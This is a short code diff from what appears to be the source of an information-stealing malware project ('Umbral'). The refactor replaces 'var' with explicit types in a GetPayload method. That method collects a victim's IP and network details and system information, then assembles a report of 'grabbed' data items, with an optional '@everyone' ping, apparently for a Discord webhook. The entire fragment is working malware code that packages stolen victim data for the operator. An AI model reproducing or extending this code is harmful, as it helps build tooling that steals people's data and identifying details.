@@ -49,17 +49,17 @@ namespace Umbral.payload.Postman
 
         internal async Task<string> GetPayload()
         {
-            var ipinfo = await IpInfo.GetInfo();
-            var systemInfo = await General.GetInfo();
+            IpFormat ipinfo = await IpInfo.GetInfo();
+            GeneralSystemInfo systemInfo = await General.GetInfo();
 
-            var payload = new PayloadFormat();
+            PayloadFormat payload = new PayloadFormat();
 
             payload.content = Settings.Ping ? "@everyone" : string.Empty;
 
-            var cellular = ipinfo.Mobile ? Convert.ToChar(9989) : Convert.ToChar(10062);
-            var proxy = ipinfo.Proxy ? Convert.ToChar(9989) : Convert.ToChar(10062);
-            var reverseProxy = proxy == Convert.ToChar(9989) ? $"\nReverse DNS: {ipinfo.Reverse}" : string.Empty;
-            var grabbedInfo = string.Empty;
+            char cellular = ipinfo.Mobile ? Convert.ToChar(9989) : Convert.ToChar(10062);
+            char proxy = ipinfo.Proxy ? Convert.ToChar(9989) : Convert.ToChar(10062);
+            string reverseProxy = proxy == Convert.ToChar(9989) ? $"\nReverse DNS: {ipinfo.Reverse}" : string.Empty;
+            string grabbedInfo = string.Empty;
             foreach (var item in _grabbedDataDict) grabbedInfo += $"\n{item.Key} : {item.Value}";
 
             payload.embeds = new[]
